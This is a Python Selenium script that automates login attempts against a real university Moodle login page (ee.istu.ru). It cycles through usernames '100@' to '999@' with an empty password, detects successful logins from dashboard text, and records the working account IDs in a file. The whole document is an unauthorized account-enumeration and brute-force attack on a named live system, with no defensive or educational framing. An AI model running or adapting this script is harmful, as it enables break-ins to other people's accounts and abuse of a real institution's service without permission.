from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import logging

url = "https://ee.istu.ru/login/index.php"

def main():
    logging.basicConfig(level=logging.CRITICAL)

    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument("--disable-notifications")
    options.add_argument("--disable-popup-blocking")
    options.add_argument('--no-sandbox')
    binary_yandex_driver_file = 'yandexdriver.exe'

    service = webdriver.ChromeService(executable_path=binary_yandex_driver_file)

    driver = webdriver.Chrome(service=service, options=options)

    with open('1.txt', 'a') as file:
        try:
            for i in range(100, 1000):
                driver.get(url)

                username_field = driver.find_element(By.NAME, "username")
                password_field = driver.find_element(By.NAME, "password")

                id = f"{i}@"
                username_field.send_keys(id)
                password_field.send_keys()
                password_field.send_keys(Keys.RETURN)

                #driver.implicitly_wait(10)
                if 'Предстоящие события' in driver.page_source:
                    print(id)
                    file.write(id)
                    driver.quit()
        finally:
            file.close()

    driver.quit()

if __name__ == "__main__":
    main()
